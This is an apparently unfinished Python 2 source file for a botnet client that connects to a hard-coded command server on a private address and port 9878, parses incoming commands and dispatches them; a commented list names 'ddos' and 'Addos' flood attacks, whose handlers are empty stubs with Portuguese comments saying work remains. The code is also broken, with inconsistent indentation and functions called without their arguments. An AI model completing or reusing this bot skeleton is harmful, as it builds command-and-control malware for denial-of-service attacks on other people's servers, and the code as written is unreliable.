# coding=utf-8

import sys
import os
import time 
import base64
import platform
import socket

import getpass
import hashlib
import requests
import thread
import json
'''
bot_commands = {
		'Command_Bot.alive{"False"}' : '', 
		'Command_Bot.ddos{"192.168.0.1", 80}': 'Simple ddos',
    'Command_Bot.Addos{"192.168.0.1", 80, 5}': 'Advanced ddos'  
  }
'''

def Command_Format(raw_command):
  
  if(raw_command.split('.')[0] == 'Command_Bot'):

    format_command = []
    
    type_command = str(raw_command.split('.')[1].split('{')[0])
    format_command = str(raw_command.split('{')[1].split('}')[0])

    return type_command, format_command

  else:
    return False


def Command_Exec(type_command, format_command):
	
  commands = {
    'ddos'  : True,
    'Addos' : True
  }

  if(type_command == 'alive'):
    #function ping
    pass


  elif(commands[type_command]):

    if(type_command == 'ddos'):
      pass

    elif(type_command == 'Addos'):
      pass

    else:
      pass    

  else:
    return False


def main():

  data_command = str('')
    
  connection_loop = bool(True)

  server_ip = str('192.168.0.7')
  server_port = int(9878)

  bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  bot_socket.connect((server_ip, server_port))
  
  while(connection_loop):

		data_command = bot_socket.recv(512)

		if(data_command != ''):
			
      type_command, format_command = Command_Format()#Funcao retorna dois valores, testar isso ainda

      Command_Exec()#Falta desenvolver as outras funcoes! 
		
    else:
      pass





if __name__ == '__main__':
  main()